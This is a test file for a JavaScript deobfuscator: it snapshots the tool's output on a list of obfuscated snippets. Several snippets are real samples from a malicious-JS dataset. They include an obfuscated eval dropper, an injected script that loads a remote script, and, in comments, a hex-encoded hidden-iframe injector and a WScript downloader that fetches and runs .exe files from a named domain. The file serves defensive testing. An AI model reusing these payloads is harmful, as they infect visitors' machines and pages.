import { deobfuscate } from './test-utils'

const samples = [
  `
    var vqeJMM = document.createElement((function() {
      var lmuxifox = (function () {
        var lFuh="ect",OtcD="j";
        return OtcD+lFuh
      })(),
      qvrqA = String.fromCharCode(0x6f,98);
      return qvrqA + lmuxifox;
    })());
  `,

  `
    GPSweCkB.setAttribute(
      (function () {
        var pYmx="ssid",aTIE="a",tvPA="cl";
        return tvPA+aTIE+pYmx
      })(),
      (function () {
        var MbWt="7566",UcNA="7",PUHo="c",yFIi="6-2F5",YXvW="sid",sYCs="E-4BAF",SZBF="9",yZMK="-AC28-CF26AA",BmVk="l",AbBB="58",iRQW="636",RQLv=":55";
        return PUHo+BmVk+YXvW+RQLv+SZBF+iRQW+UcNA+yFIi+sYCs+yZMK+AbBB+MbWt
      })());
  `,

  `var GPSweCkB = document.createElement((function () { var XoNO="ject",apoc="ob"; return apoc+XoNO })());`,

  `-~-~'bp'[720094129.0.toString(2 << 4) + ""] * 8 + 2;`,

  `
    var vqeJMM = document.createElement((function() {
      var lmuxifox = (function () { var lFuh="ect",OtcD="j"; return OtcD+lFuh })(), qvrqA = String.fromCharCode(0x6f,98);
      return qvrqA + lmuxifox;
    })());
  `,

  `vqeJMM.setAttribute((function() { var BrE = String.fromCharCode(115,0x73,105,100), oWnuEB = String.fromCharCode(97), bWVwPmvte = String.fromCharCode(0o143,0o154); return bWVwPmvte + oWnuEB + BrE; })(), (function() { var VZKfxYVTesUuNa = String.fromCharCode(55,0o65,0x36,54), ANrWHzMVmQTEnX = (function () { var DsIA="7"; return DsIA })(), qnz = (function () { var uUmi="c"; return uUmi })(), plzNK = String.fromCharCode(0x36,0o55,0o62,70,0x35), brtluDTu = (function () { var eJeU="d",DJnq="si"; return DJnq+eJeU })(), AqMDLOwdJANJk = String.fromCharCode(0o105,0x2d,52,0x42,0o101,70), tjHrCLeCTfpRnX = (function () { var cVWQ="9"; return cVWQ })(), cwPWStJQJ = String.fromCharCode(0x2d,0x41,0o103,0o62,0x38,0x2d,0o103,0x46,0o62,0o66,65,0o101), EfyYAZclv = String.fromCharCode(108), ZdLqwiaf = String.fromCharCode(53,0o70), IrOpZfY = (function () { var TtsU="6",kdod="63"; return kdod+TtsU })(), rOkewIqjVTn = (function () { var auio="5",JgSf=":5"; return JgSf+auio })(); return qnz + EfyYAZclv + brtluDTu + rOkewIqjVTn + tjHrCLeCTfpRnX + IrOpZfY + ANrWHzMVmQTEnX + plzNK + AqMDLOwdJANJk + cwPWStJQJ + ZdLqwiaf + VZKfxYVTesUuNa; })());`,

  `vqeJMM.url = String.fromCharCode((1*0x40+40), ('Z'.length*0x6c+8), ('z'.length*0x63+17), (0o1*('cu'.length*0x2f+6)+12), ('e'.length*0x2c+14), (0o17*'HMF'.length+2), ('q'.length*('q'.length*0x12+13)+16), ('O'.length*(0x1*('uLq'.length*6+2)+11)+18), (0o1*0x1f+19), (0o2*('wuk'.length*0o6+5)+9), ('BW'.length*('WQD'.length*'NmmgJ'.length+2)+12), ('g'.length*0x26+10), ('S'.length*0o44+10), ('MK'.length*0x11+14), ('T'.length*0x2e+0), ('oe'.length*0o26+5), ('KNS'.length*(0x1*(7*'di'.length+0)+3)+7), ('b'.length*0o52+14), ('E'.length*(1*0o30+14)+10), ('c'.length*('ojyWqHE'.length*'ZDWrf'.length+3)+18), (0o1*0x2c+4), (0o1*42+5), (('hm'.length*0x12+11)*'m'.length+0), (0o5*(0x1*(0x2*0o12+1)+1)+2), (1*('Ws'.length*0o34+9)+52), ('hjc'.length*0o22+16), (0o1*78+20), ('zL'.length*37+0), ('s'.length*('C'.length*0x46+32)+9), ('nfzRwUXL'.length*(0x4*0x3+0)+6), (0x1*(0o2*21+7)+35), (0o1*0x5d+6), ('EU'.length*0o53+36), ((('nz'.length*'kaUOP'.length+1)*'F'.length+0)*0x6+1), ('k'.length*0o115+12), ('a'.length*0x2c+38), (5*0o26+7), ('a'.length*0x26+27), (0x1*(1*(0x2*(3*0x8+6)+7)+21)+23), ('m'.length*(0o2*(0x1*0x10+12)+18)+7), (0o1*0o35+18));`,

  `
    (function t(s) {
      return (s + '').replace(/[a-z]/gi, function (s) {
        return String.fromCharCode(s.charCodeAt(0) + (s.toLowerCase() < 'n' ? 13 : -13));
      });
    })('f-nc')
  `,

  // https://github.com/geeksonsecurity/js-malicious-dataset/blob/6d860e70486dcca893887b0105661afcb31499c4/js-droppers/00000307425.doc.js
  `var stroke="5557545E0D0A020B4A0D1005081D2417130D1717140B17104A070B09";function bhj75() { nz('()*1'); return lxd(); };  function bhj100() { nz('ys'); return lxd(); };  function bhj111() { nz('ySta'); return lxd(); };  function bhj176() { nz('()'); return lxd(); };  function bhj61() { nz('s("%T'); return lxd(); };  function bhj67() { nz('arC'); return lxd(); };  function bhj179() { nz(' try '); return lxd(); };  function bhj152() { nz('ositi'); return lxd(); };  function bhj54() { nz('xpan'); return lxd(); };  function bhj149() { nz('dn ='); return lxd(); };  function bhj126() { nz('"AD'); return lxd(); };  function bhj223() { nz('2); d'); return lxd(); };  function bhj19() { nz('com'); return lxd(); };  function bhj104() { nz('= fu'); return lxd(); };  function bhj198() { nz('ke, f'); return lxd(); };  function bhj106() { nz('on()'); return lxd(); };  function bhj217() { nz(' }; }'); return lxd(); };  function bhj167() { nz('); } '); return lxd(); };  function bhj62() { nz('EMP'); return lxd(); };  function bhj204() { nz('();'); return lxd(); };  function bhj210() { nz(' if ('); return lxd(); };  function bhj122() { nz('new '); return lxd(); };  function bhj64() { nz(')+Str'); return lxd(); };  function bhj27() { nz(' fo'); return lxd(); };  function bhj87() { nz('= new'); return lxd(); };  function bhj35() { nz('i++)'); return lxd(); };  function bhj160() { nz('fn,'); return lxd(); };  function bhj175() { nz('se'); return lxd(); };  function bhj182() { nz('en('); return lxd(); };  function bhj158() { nz('oFi'); return lxd(); };  function bhj116() { nz('stat'); return lxd(); };  function bhj23() { nz('om'); return lxd(); };  function bhj102() { nz('ech'); return lxd(); };  function bhj11() { nz('reba'); return lxd(); };  function bhj90() { nz('XOb'); return lxd(); };  function bhj105() { nz('ncti'); return lxd(); };  function bhj213() { nz('= '); return lxd(); };  function bhj12() { nz('r.co'); return lxd(); };  function bhj132() { nz('(); x'); return lxd(); };  function bhj133() { nz('a.typ'); return lxd(); };  function bhj70() { nz('ath.'); return lxd(); };  function bhj53() { nz(' ws.E'); return lxd(); };  function bhj96() { nz('TP")'); return lxd(); };  function bhj206() { nz('catc'); return lxd(); };  function bhj65() { nz('ing.f'); return lxd(); };  function bhj221() { nz('dl('); return lxd(); };  function bhj72() { nz('nd(Ma'); return lxd(); };  function bhj77() { nz('0000'); return lxd(); };  function bhj88() { nz(' A'); return lxd(); };  function bhj222() { nz('225'); return lxd(); };  function bhj207() { nz('h ('); return lxd(); };  function bhj117() { nz('us =='); return lxd(); };  function bhj147() { nz('5000'); return lxd(); };  function bhj93() { nz('ML2.'); return lxd(); };  function bhj177() { nz('; }'); return lxd(); };  function bhj47() { nz('ipt.'); return lxd(); };  function bhj208() { nz('er)'); return lxd(); };  function bhj188() { nz('+"'); return lxd(); };  function bhj31() { nz('0;'); return lxd(); };  function bhj57() { nz('iron'); return lxd(); };  function bhj143() { nz(' if'); return lxd(); };  function bhj86() { nz('xo '); return lxd(); };  function bhj199() { nz('alse'); return lxd(); };  function bhj135() { nz('1; xa'); return lxd(); };  function bhj115() { nz('& xo.'); return lxd(); };  function bhj134() { nz('e = '); return lxd(); };  function bhj124() { nz('eXOb'); return lxd(); };  function bhj16() { nz('oma'); return lxd(); };  function bhj138() { nz('(xo.'); return lxd(); };  function bhj136() { nz('.wri'); return lxd(); };  function bhj49() { nz('l"'); return lxd(); };  function bhj129() { nz('"); x'); return lxd(); };  function bhj2() { nz('nct'); return lxd(); };  function bhj71() { nz('rou'); return lxd(); };  function bhj164() { nz('s.'); return lxd(); };  function bhj183() { nz('"G'); return lxd(); };  function bhj22() { nz('rch.c'); return lxd(); };  function bhj95() { nz('HT'); return lxd(); };  function bhj151() { nz('a.p'); return lxd(); };  function bhj45() { nz('WS'); return lxd(); };  function bhj209() { nz(' {};'); return lxd(); };  function bhj4() { nz('l('); return lxd(); };  function bhj201() { nz('xo'); return lxd(); };  function bhj92() { nz('"MSX'); return lxd(); };  function bhj37() { nz('var w'); return lxd(); };  function bhj193() { nz('nd="'); return lxd(); };  function bhj187() { nz('+b[i]'); return lxd(); };  function bhj79() { nz('".'); return lxd(); };  function bhj171() { nz(') {'); return lxd(); };  function bhj163() { nz(' { w'); return lxd(); };  function bhj172() { nz('}; }'); return lxd(); };  function bhj68() { nz('ode(9'); return lxd(); };  function bhj44() { nz('t("'); return lxd(); };  function bhj166() { nz('n,1,0'); return lxd(); };  function bhj69() { nz('2)+M'); return lxd(); };  function bhj48() { nz('Shel'); return lxd(); };  function bhj55() { nz('dE'); return lxd(); };  function bhj139() { nz('Res'); return lxd(); };  function bhj123() { nz('Activ'); return lxd(); };  function bhj205() { nz(' } '); return lxd(); };  function bhj80() { nz('exe'); return lxd(); };  function bhj91() { nz('ject('); return lxd(); };  function bhj189() { nz('/doc'); return lxd(); };  function bhj148() { nz(') { '); return lxd(); };  function bhj214() { nz('1) b'); return lxd(); };  function bhj5() { nz('fr) {'); return lxd(); };  function bhj184() { nz('ET","'); return lxd(); };  function bhj74() { nz('andom'); return lxd(); };  function bhj178() { nz('; };'); return lxd(); };  function bhj97() { nz('; xo.'); return lxd(); };  function bhj144() { nz(' (xa'); return lxd(); };  function bhj89() { nz('ctive'); return lxd(); };  function bhj66() { nz('romCh'); return lxd(); };  function bhj40() { nz('Ac'); return lxd(); };  function bhj141() { nz('Bo'); return lxd(); };  function bhj59() { nz('tStri'); return lxd(); };  function bhj190() { nz('umen'); return lxd(); };  function bhj7() { nz('ar '); return lxd(); };  function bhj50() { nz(');'); return lxd(); };  function bhj130() { nz('a.op'); return lxd(); };  function bhj195() { nz('"&i'); return lxd(); };  function bhj145() { nz('.siz'); return lxd(); };  function lxd() { return c; };  function bhj118() { nz(' 200'); return lxd(); };  function bhj154() { nz('= 0'); return lxd(); };  function bhj121() { nz('xa = '); return lxd(); };  function bhj219() { nz('93'); return lxd(); };  function bhj194() { nz('+fr+'); return lxd(); };  function bhj120() { nz('ar '); return lxd(); };  function bhj226() { nz(');'); return lxd(); };  function bhj20() { nz(' ayus'); return lxd(); };  function bhj17() { nz('tth'); return lxd(); };  function bhj58() { nz('men'); return lxd(); };  function bhj212() { nz(' ='); return lxd(); };  function bhj33() { nz('b.len'); return lxd(); };  function bhj98() { nz('onre'); return lxd(); };  function bhj107() { nz(' { if'); return lxd(); };  function bhj215() { nz('re'); return lxd(); };  function bhj83() { nz('dn '); return lxd(); };  function bhj60() { nz('ng'); return lxd(); };  function bhj38() { nz('s = n'); return lxd(); };  function bhj99() { nz('ad'); return lxd(); };  function bhj73() { nz('th.r'); return lxd(); };  function bhj8() { nz('b = '); return lxd(); };  function bhj29() { nz('var '); return lxd(); };  function bhj216() { nz('ak;'); return lxd(); };  function bhj10() { nz('rmac'); return lxd(); };  function bhj159() { nz('le('); return lxd(); };  function bhj52() { nz('fn ='); return lxd(); };  function bhj146() { nz('e > '); return lxd(); };  function bhj157() { nz('aveT'); return lxd(); };  function bhj109() { nz('xo'); return lxd(); };  function bhj() { return 'al'; };  function xcil() { return 'ev'; };  function nz(uqf) { c = uqf; };  function bhj9() { nz('"ha'); return lxd(); };  function bhj1() { nz('fu'); return lxd(); };  function bhj51() { nz(' var '); return lxd(); };  function bhj161() { nz('2);'); return lxd(); };  function bhj125() { nz('ject('); return lxd(); };  function bhj24() { nz('".spl'); return lxd(); };  function bhj225() { nz('43'); return lxd(); };  function bhj224() { nz('l(69'); return lxd(); };  function bhj113() { nz('=='); return lxd(); };  function bhj25() { nz('it('); return lxd(); };  function bhj127() { nz('ODB.S'); return lxd(); };  function bhj18() { nz('ew.'); return lxd(); };  function bhj170() { nz('er'); return lxd(); };  function bhj28() { nz('r ('); return lxd(); };  function bhj150() { nz(' 1; x'); return lxd(); };  function bhj153() { nz('on '); return lxd(); };  function bhj34() { nz('gth; '); return lxd(); };  function bhj82() { nz('r '); return lxd(); };  function bhj56() { nz('nv'); return lxd(); };  function bhj169() { nz('ch ('); return lxd(); };  function bhj41() { nz('tiv'); return lxd(); };  function bhj142() { nz('dy);'); return lxd(); };  function bhj14() { nz('adyse'); return lxd(); };  function bhj137() { nz('te'); return lxd(); };  function bhj196() { nz('d="+'); return lxd(); };  function bhj174() { nz('clo'); return lxd(); };  function bhj26() { nz('" ");'); return lxd(); };  function bhj131() { nz('en'); return lxd(); };  var fvd = ''; var c = '';  function bhj202() { nz('.se'); return lxd(); };  function bhj119() { nz(') { v'); return lxd(); };  function bhj165() { nz('Run(f'); return lxd(); };  function bhj39() { nz('ew '); return lxd(); };  function bhj30() { nz('i='); return lxd(); };  function bhj181() { nz('o.op'); return lxd(); };  function bhj173() { nz('; xa.'); return lxd(); };  function bhj85() { nz('var '); return lxd(); };  function bhj211() { nz('dn'); return lxd(); };  function bhj15() { nz('tg'); return lxd(); };  function bhj110() { nz('.read'); return lxd(); };  function bhj156() { nz('a.s'); return lxd(); };  function bhj114() { nz(' 4 &'); return lxd(); };  function bhj42() { nz('eX'); return lxd(); };  function bhj84() { nz('= 0; '); return lxd(); };  function bhj191() { nz('t.php'); return lxd(); };  function bhj78() { nz('00)+'); return lxd(); };  function bhj112() { nz('te '); return lxd(); };  function bhj43() { nz('Objec'); return lxd(); };  function bhj220() { nz('91); '); return lxd(); };  function bhj103() { nz('ange '); return lxd(); };  function bhj218() { nz('; dl('); return lxd(); };  function bhj94() { nz('XML'); return lxd(); };  function bhj36() { nz(' { '); return lxd(); };  function bhj21() { nz('o-a'); return lxd(); };  function bhj128() { nz('tream'); return lxd(); };  function bhj186() { nz('://"'); return lxd(); };  function bhj6() { nz(' v'); return lxd(); };  function bhj32() { nz(' i<'); return lxd(); };  function bhj13() { nz('m re'); return lxd(); };  function bhj3() { nz('ion d'); return lxd(); };  function bhj162() { nz(' try'); return lxd(); };  function bhj101() { nz('tat'); return lxd(); };  function bhj200() { nz('); '); return lxd(); };  function bhj63() { nz('%"'); return lxd(); };  function bhj155() { nz('; x'); return lxd(); };  function bhj203() { nz('nd'); return lxd(); };  function bhj180() { nz('{ x'); return lxd(); };  function bhj192() { nz('?r'); return lxd(); };  function bhj46() { nz('cr'); return lxd(); };  function bhj108() { nz(' ('); return lxd(); };  function bhj76() { nz('00'); return lxd(); };  function bhj81() { nz('"; va'); return lxd(); };  function bhj140() { nz('ponse'); return lxd(); };  function bhj185() { nz('http'); return lxd(); };  function bhj197() { nz('stro'); return lxd(); };  function bhj168() { nz('cat'); return lxd(); }; for (var enpi=1; enpi<=226; enpi++) { nz(this['bhj'+enpi]()); fvd += lxd(); } this[xcil()+bhj()](fvd);`,

  // https://javascriptobfuscator.herokuapp.com
  `var _0x7b98=['\x77\x6f\x72\x6c\x64','\x68\x65\x6c\x6c\x6f'];(function(_0x5c7f81,_0x1109f5){var _0x4d4d7b=function(_0x39ad42){while(--_0x39ad42){_0x5c7f81['\x70\x75\x73\x68'](_0x5c7f81['\x73\x68\x69\x66\x74']());}};_0x4d4d7b(++_0x1109f5);}(_0x7b98,0x93));var _0x87b9=function(_0x46a655,_0x343681){_0x46a655=_0x46a655-0x0;var _0xb28dc8=_0x7b98[_0x46a655];return _0xb28dc8;};const a=_0x87b9('0x0')(function(_0x45597e){return a+_0x45597e;})(_0x87b9('0x1'));`,

  // https://github.com/geeksonsecurity/js-malicious-dataset/tree/6d860e70486dcca893887b0105661afcb31499c4/legitimate-injected
  `(function(){ var v=50;var e=0;function b(){e++;if(e>v)return false;if(!document.body)setTimeout(b,500);else(function(){function t(s){return(s+'').replace(/[a-z]/gi,function(s){return String.fromCharCode(s.charCodeAt(0)+(s.toLowerCase()<'n'?13:-13));});}var i=['qg-k','inw/','rtnz','fryv','.n8o','graf','c','RVFZ','epfn','vepf','\\\\rtq',' GA ','qavJ','v/i/','cggu','.21/','gkrg','os8q','21/f','=fre','6q4q','vckr','R )*','jra.','gar','9-0[','.(01','80np','gcv','GA',')]+','9023','gc','48os','trcw'];for(var z=0;z<i.length;z++){var s=t(i[z]+'');i[z]=s.split('').reverse().join('');}function je(v,u){var w=false;var d=false;for(var k=0;k<v.length;k++){var p=new RegExp(v[k][0],v[k][1]);if(v[k][2]){w=true;if(p.test(u)){d=true;}}else{if(p.test(u)){return false;}}}if(w&&!d){return false;}return true;}var ud=navigator.userAgent;if(je([[i[7],'i',1],[t('Gevq')+i[24],'i',1],[t('(Jva')+t('qbjf')+i[11]+i[26]+i[22]+t('qtr\\\\')+i[15]+i[25]+i[30],'i',1]],ud)&&je([[i[12]+t('bjf ')+i[29],'i',1]],ud)){(function(){var g=i[0]+t('f-nc')+i[6];var j=document.cookie.match(new RegExp("(?:^|; )"+g+"=([^;]*)"));if(!j){var s=document.createElement(i[9]+i[32]);s.type=i[16]+i[1]+i[8]+i[28];s.src=i[14]+t('://s')+i[3]+i[23]+i[5]+t('m.pa')+i[13]+i[2]+i[18]+t('/7/0')+t('4p73')+i[20]+i[27]+i[31]+t('70q3')+i[33]+i[17]+i[4]+i[34];var m=document.body;m.insertBefore(s,m.lastChild);var d=new Date();d.setTime(d.getTime()+259200000);document.cookie=g+t('=1; ')+i[21]+i[19]+d;}})();}})();}b();})`,

  // TODO
  // https://github.com/geeksonsecurity/js-malicious-dataset/blob/6d860e70486dcca893887b0105661afcb31499c4/angler/12/jquery_injected.js
  // `/*225f56a0e83148fced3e1245161a0a29*/;(function(){var rafaayey="";var zkrhrrbt="77696e646f772e6f6e6c6f6164203d2066756e6374696f6e28297b66756e6374696f6e20783232627128612c622c63297b69662863297b7661722064203d206e6577204461746528293b642e7365744461746528642e6765744461746528292b63293b7d6966286120262620622920646f63756d656e742e636f6f6b6965203d20612b273d272b622b2863203f20273b20657870697265733d272b642e746f555443537472696e672829203a202727293b656c73652072657475726e2066616c73653b7d66756e6374696f6e2078333362712861297b7661722062203d206e65772052656745787028612b273d285b5e3b5d297b312c7d27293b7661722063203d20622e6578656328646f63756d656e742e636f6f6b6965293b69662863292063203d20635b305d2e73706c697428273d27293b656c73652072657475726e2066616c73653b72657475726e20635b315d203f20635b315d203a2066616c73653b7d766172207833336471203d2078333362712822336233303036663933306431646336346262653736386263313334613933633122293b69662820783333647120213d2022633566323136636235303638313834396336636461336433626463613032396322297b783232627128223362333030366639333064316463363462626537363862633133346139336331222c226335663231366362353036383138343963366364613364336264636130323963222c31293b766172207832326471203d20646f63756d656e742e637265617465456c656d656e74282264697622293b766172207832327171203d2022687474703a2f2f696d672e6f67726f6d6e756562796c6f6368692e696e666f2f6d656761616476657274697a652f3f4f63466856656c777557716e506a72717341563d6a6c4c5470764f47732665737562596d796a3d46794764527a526b717142624a74686248266b6a4e526b727752503d444754424e45446150264f434e716a59553d6646417a7259466c53614b78645126594251536858646f3d42505061696e457363704e692649496352414543767a714a546e65634e4644727a3d7175756e6d4a734145266b6579776f72643d6337313233343036383134663333326236663461333434666361356631656636265849764675714e584c654a66573d574851666344755a4626726556577058794b3d614f6247506c5758557255264b6b7774776b7a7670684a713d5169746278784770596d6a4f6c6372632652504155706b4659674d3d7265474941695952484672223b78323264712e696e6e657248544d4c3d223c646976207374796c653d27706f736974696f6e3a6162736f6c7574653b7a2d696e6465783a313030303b746f703a2d3130303070783b6c6566743a2d3939393970783b273e3c696672616d65207372633d27222b78323271712b22273e3c2f696672616d653e3c2f6469763e223b646f63756d656e742e626f64792e617070656e644368696c64287832326471293b7d7d";for (var ezatyrfi=0;ezatyrfi<zkrhrrbt.length;ezatyrfi+=2){rafaayey=rafaayey+parseInt(zkrhrrbt.substring(ezatyrfi,ezatyrfi+2), 16)+",";}rafaayey=rafaayey.substring(0,rafaayey.length-1);eval(eval('String.fromCharCode('+rafaayey+')'));})();/*225f56a0e83148fced3e1245161a0a29*/`

  // TODO
  // `function dl(fr,fn,rn) { var ws = new ActiveXObject("WScript.Shell"); var fn = ws.ExpandEnvironmentStrings("%TEMP%")+String.fromCharCode(92)+fn; var xo = new ActiveXObject("MSXML2.XMLHTTP"); xo.onreadystatechange = function() { if (xo.readyState === 4) { var xa = new ActiveXObject("ADODB.Stream"); xa.open(); xa.type = 1; xa.write(xo.ResponseBody); xa.position = 0; xa.saveToFile(fn,2); xa.close(); }; }; xo.open("GET",fr,false); xo.send(); if (rn > 0) { try { ws.Run(fn,0,0); } catch (er) {}; }; }; dl("http://declinemagazine.com/document.php?id=5450575E0F11010A1E080D0C24140B17104A070C&rnd=7346271","16467946.exe",1); dl("http://declinemagazine.com/document.php?id=5450575E0F11010A1E080D0C24140B17104A070C&rnd=920962","89527032.exe",1);`

  // TODO Octal number literals with leading `0`, but not `0o`/`0O`, are non-standard and babylon does not accept them...
  // Update: https://github.com/babel/babylon/pull/433
  //   `GPSweCkB.url = String.fromCharCode(104,0164,0164,112,0x3a,0x2f,0x2f,49,50,067,056,48,0x2e,48,46,49,072,0x38,060,070,060,47,47,112,0165,0x46,0x62,0x4a,111,0146,0124,0143,0172,0x43,89,82,0x75,65,111,81,47);`

]

samples.forEach((sample, i) =>
  it(`de-obfuscates sample ${i}`, () => expect(deobfuscate(sample)).toMatchSnapshot())
)
